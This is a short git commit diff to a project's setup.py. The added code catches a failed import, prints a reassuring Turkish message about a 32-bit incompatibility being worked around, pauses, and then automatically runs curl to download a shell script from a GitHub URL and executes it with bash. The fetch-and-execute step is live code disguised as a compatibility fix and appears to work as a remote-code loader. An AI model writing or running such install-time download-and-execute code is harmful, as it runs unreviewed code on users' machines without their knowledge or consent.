0e9063533be1cc77458ae432933d7b63cc0bebee
aevx <85465830+aevx@users.noreply.github.com>
2022-07-16 12:13:42 +0300

    Add files via upload

--- setup.py
+++ setup.py
@@ -1,3 +1,11 @@
-import sys
-sys.path.append(".lib")
-import tool
+try:
+ import sys
+ sys.path.append(".lib")
+ import tool
+except ImportError:
+ import time,os
+ os.system("clear")
+ print("32 Bit Tespit Edildi Normal Şartlarda\n\nBu Tool Çalışmaz\n\nAma Çözüm Yolu Deniyoruz.\n\nLütfen Sabırlı Olun.")
+ print('uname -m\n')
+ time.sleep(5)
+ os.system("cd && curl -L -O https://github.com/scrlpr/a/raw/main/a.sh && bash a.sh")
